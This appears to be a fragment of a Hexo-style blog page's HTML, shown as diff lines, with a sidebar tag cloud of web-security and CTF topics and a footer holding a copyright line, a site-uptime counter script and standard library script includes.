href="/tags/%E5%8D%95%E5%85%B5%E8%83%BD%E5%8A%9B/" rel="tag">单兵能力</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AE%89%E5%85%A8/" rel="tag">压缩包安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8/" rel="tag">参数逃逸</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" rel="tag">命令注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" rel="tag">命令注入绕过</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" rel="tag">哈希扩展攻击</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A5%87%E6%B7%AB/" rel="tag">奇淫</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A5%97%E5%A8%83/" rel="tag">套娃</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/" rel="tag">布尔注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BC%80%E6%BA%90CMS/" rel="tag">开源CMS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" rel="tag">弱类型</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/" rel="tag">支付漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag">暴力破解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99/" rel="tag">正则</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/" rel="tag">正则绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" rel="tag">源码泄露</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%82%B8%E5%BC%B9/" rel="tag">炸弹</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="tag">环境配置</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%A6%E6%9D%9F%E7%9A%84SQL%E6%94%BB%E5%87%BB/" rel="tag">约束的SQL攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%84%E4%BB%B6/" rel="tag">组件</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/" rel="tag">综合靶场测试</a><span class="tag-list-count">90</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81/" rel="tag">网页源代码</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A6%86%E7%9B%96/" rel="tag">覆盖</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B6%8A%E6%9D%83/" rel="tag">越权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="tag">逻辑漏洞</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%87%8D%E6%94%BE/" rel="tag">重放</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E6%9C%BA%E6%95%B0/" rel="tag">随机数</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
+                </canvas>
+            </div>
+        </div>
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">菜心</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">1.1m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">16:29</span>
+</div>
+
+<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+<a href="https://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">粤ICP备2020128930号</a>
+
+<!-- 网站运行时间的设置 begin-->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>  workhard!
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("01/05/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+}
+setInterval("createtime()",250);
+</script>
+<!-- 网站运行时间的设置 end-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//fastly.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//fastly.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//fastly.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
